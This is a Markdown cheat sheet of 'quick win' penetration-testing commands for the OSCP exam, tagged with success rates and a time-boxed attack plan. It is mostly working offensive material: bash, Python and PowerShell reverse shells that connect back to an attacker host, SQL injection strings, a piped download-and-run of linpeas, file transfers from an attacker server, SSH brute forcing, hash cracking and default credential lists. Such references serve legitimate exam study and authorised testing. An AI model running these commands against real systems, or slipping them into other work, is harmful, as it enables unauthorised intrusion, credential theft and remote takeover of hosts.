# Quick Wins - High Success Rate Commands

Commands that frequently yield results in penetration testing scenarios. Perfect for OSCP exam time management.

## Network Discovery

### Live Host Discovery
```bash
nmap -sn <TARGET_SUBNET>
```
**Tags**: `[NOISY]` `[FAST]` `[OSCP:HIGH]`
**Success Rate**: 95%
**Time**: <1 minute

### Quick Port Scan
```bash
nmap -Pn -p- --min-rate=1000 <TARGET>
```
**Tags**: `[NOISY]` `[ENUM]` `[OSCP:HIGH]`
**Success Rate**: 90%
**Time**: 2-3 minutes

### Service Version Detection
```bash
nmap -sV -sC -p <PORTS> <TARGET>
```
**Tags**: `[NOISY]` `[ENUM]` `[RELIABLE]`
**Success Rate**: 85%
**Time**: 1-2 minutes per 10 ports

## Web Enumeration

### Directory Discovery
```bash
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,html,txt
```
**Tags**: `[NOISY]` `[WEB]` `[QUICK_WIN]` `[OSCP:HIGH]`
**Success Rate**: 80%
**Time**: 2-5 minutes

### Technology Stack Identification
```bash
whatweb -v http://<TARGET>
```
**Tags**: `[ENUM]` `[FAST]` `[WEB]`
**Success Rate**: 95%
**Time**: <30 seconds

### Nikto Web Scanner
```bash
nikto -h http://<TARGET>
```
**Tags**: `[NOISY]` `[WEB]` `[AUTOMATED]`
**Success Rate**: 70%
**Time**: 5-10 minutes

## SMB Enumeration

### SMB Share Enumeration
```bash
smbclient -L \\\\<TARGET> -N
```
**Tags**: `[SMB]` `[ENUM]` `[QUICK_WIN]`
**Success Rate**: 75%
**Time**: <30 seconds

### Enum4linux Full Scan
```bash
enum4linux -a <TARGET>
```
**Tags**: `[SMB]` `[NOISY]` `[ENUM]` `[OSCP:HIGH]`
**Success Rate**: 70%
**Time**: 2-5 minutes

### SMB Null Session Check
```bash
rpcclient -U "" -N <TARGET>
```
**Tags**: `[SMB]` `[QUICK_WIN]`
**Success Rate**: 40%
**Time**: <10 seconds

## SQL Injection

### Basic SQLi Test
```bash
' OR 1=1--
```
**Tags**: `[SQLI]` `[MANUAL]` `[QUICK_WIN]` `[OSCP:HIGH]`
**Success Rate**: 60%
**Time**: Instant

### SQLMap Basic Scan
```bash
sqlmap -u "http://<TARGET>/page.php?id=1" --batch --banner
```
**Tags**: `[SQLI]` `[NOISY]` `[AUTOMATED]`
**Success Rate**: 65%
**Time**: 2-5 minutes

### Time-Based Blind SQLi
```bash
'; IF(1=1, SLEEP(5), 0)--
```
**Tags**: `[SQLI]` `[STEALTH]` `[MANUAL]`
**Success Rate**: 45%
**Time**: Variable

## Reverse Shells

### Bash Reverse Shell
```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```
**Tags**: `[LINUX]` `[RCE]` `[QUICK_WIN]` `[OSCP:HIGH]`
**Success Rate**: 90% (on Linux)
**Time**: Instant

### Python Reverse Shell
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
**Tags**: `[LINUX]` `[RCE]` `[CROSS_PLATFORM]`
**Success Rate**: 85%
**Time**: Instant

### PowerShell Reverse Shell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
**Tags**: `[WINDOWS]` `[RCE]` `[QUICK_WIN]`
**Success Rate**: 80%
**Time**: Instant

## Privilege Escalation - Linux

### SUID Binary Search
```bash
find / -perm -4000 -type f 2>/dev/null
```
**Tags**: `[LINUX]` `[PRIVESC]` `[QUICK_WIN]` `[OSCP:HIGH]`
**Success Rate**: 70%
**Time**: <30 seconds

### Sudo Rights Check
```bash
sudo -l
```
**Tags**: `[LINUX]` `[PRIVESC]` `[FAST]`
**Success Rate**: 60%
**Time**: Instant

### Kernel Version Check
```bash
uname -a && cat /etc/*release
```
**Tags**: `[LINUX]` `[ENUM]` `[PRIVESC]`
**Success Rate**: 100%
**Time**: Instant

### LinPEAS Automated Enum
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
**Tags**: `[LINUX]` `[PRIVESC]` `[AUTOMATED]` `[REQUIRES_INTERNET]`
**Success Rate**: 85%
**Time**: 2-5 minutes

## Privilege Escalation - Windows

### System Information
```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
**Tags**: `[WINDOWS]` `[ENUM]` `[PRIVESC]`
**Success Rate**: 100%
**Time**: Instant

### Unquoted Service Paths
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
**Tags**: `[WINDOWS]` `[PRIVESC]` `[QUICK_WIN]`
**Success Rate**: 30%
**Time**: <10 seconds

### AlwaysInstallElevated Check
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
**Tags**: `[WINDOWS]` `[PRIVESC]` `[QUICK_WIN]`
**Success Rate**: 20%
**Time**: Instant

### Windows Exploit Suggester
```bash
python3 windows-exploit-suggester.py --database <DB> --systeminfo <SYSINFO>
```
**Tags**: `[WINDOWS]` `[PRIVESC]` `[AUTOMATED]`
**Success Rate**: 60%
**Time**: <1 minute

## File Transfer

### Python HTTP Server
```bash
# On attacker machine
python3 -m http.server 8000

# On target
wget http://<LHOST>:8000/<FILE>
curl -o <FILE> http://<LHOST>:8000/<FILE>
```
**Tags**: `[TRANSFER]` `[QUICK_WIN]` `[CROSS_PLATFORM]`
**Success Rate**: 95%
**Time**: <30 seconds

### PowerShell Download
```powershell
iwr -uri http://<LHOST>/<FILE> -outfile <FILE>
(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>/<FILE>', '<FILE>')
```
**Tags**: `[WINDOWS]` `[TRANSFER]` `[QUICK_WIN]`
**Success Rate**: 90%
**Time**: <30 seconds

### Base64 Transfer
```bash
# Encode on attacker
base64 -w0 <FILE>

# Decode on target
echo "<BASE64_STRING>" | base64 -d > <FILE>
```
**Tags**: `[TRANSFER]` `[STEALTH]` `[MANUAL]`
**Success Rate**: 100%
**Time**: Variable

## Password Attacks

### Hydra SSH Brute Force
```bash
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET>
```
**Tags**: `[BRUTEFORCE]` `[SSH]` `[NOISY]`
**Success Rate**: 40%
**Time**: Variable (5-30 minutes)

### John the Ripper - Shadow File
```bash
unshadow passwd shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```
**Tags**: `[BRUTEFORCE]` `[OFFLINE]` `[QUICK_WIN]`
**Success Rate**: 60%
**Time**: Variable

### Hashcat NTLM
```bash
hashcat -m 1000 <HASH_FILE> /usr/share/wordlists/rockyou.txt
```
**Tags**: `[BRUTEFORCE]` `[WINDOWS]` `[OFFLINE]`
**Success Rate**: 50%
**Time**: Variable

## Default Credentials

### Common Web App Defaults
```
admin:admin
admin:password
admin:123456
root:root
root:toor
guest:guest
```
**Tags**: `[QUICK_WIN]` `[MANUAL]` `[OSCP:HIGH]`
**Success Rate**: 30%
**Time**: <1 minute

### Tomcat Default
```
tomcat:tomcat
admin:admin
manager:manager
```
**Tags**: `[WEB]` `[QUICK_WIN]` `[DEFAULT_CREDS]`
**Success Rate**: 25%
**Time**: <30 seconds

### Database Defaults
```
MySQL: root:(blank)
PostgreSQL: postgres:postgres
MSSQL: sa:sa
Oracle: SYSTEM:oracle
```
**Tags**: `[DATABASE]` `[QUICK_WIN]` `[DEFAULT_CREDS]`
**Success Rate**: 20%
**Time**: <30 seconds

## Command Prioritization

### Initial Enumeration (First 10 minutes)
1. Quick port scan
2. Service version detection on open ports
3. Web technology identification (if applicable)
4. SMB enumeration (if port 445/139 open)
5. Default credential attempts

### Deep Enumeration (Next 20 minutes)
1. Full directory bruteforce
2. Nikto scan
3. SQL injection tests
4. Detailed service enumeration
5. Vulnerability research based on versions

### Exploitation (After enumeration)
1. Try quick wins first (default creds, basic SQLi)
2. Exploit known vulnerabilities
3. Attempt authenticated attacks if creds found
4. Try multiple reverse shell types
5. Document what works for report

### Post-Exploitation (After shell)
1. Upgrade shell to TTY
2. Check sudo permissions
3. Search for SUID binaries
4. Run automated enumeration scripts
5. Look for credentials in files

## Tips for Maximum Success

1. **Run Multiple Tools in Parallel**: Don't wait for one scan to finish
2. **Check Default Credentials Early**: Quick and often successful
3. **Note Service Versions**: Essential for finding exploits
4. **Try Manual Techniques**: When automated tools fail
5. **Keep Good Notes**: Track what worked for the report
6. **Use Time Boxes**: Don't spend too long on one approach
7. **Have Backups Ready**: Multiple reverse shell types, wordlists

---

*Part of the [CRACK Reference System](./index.md)*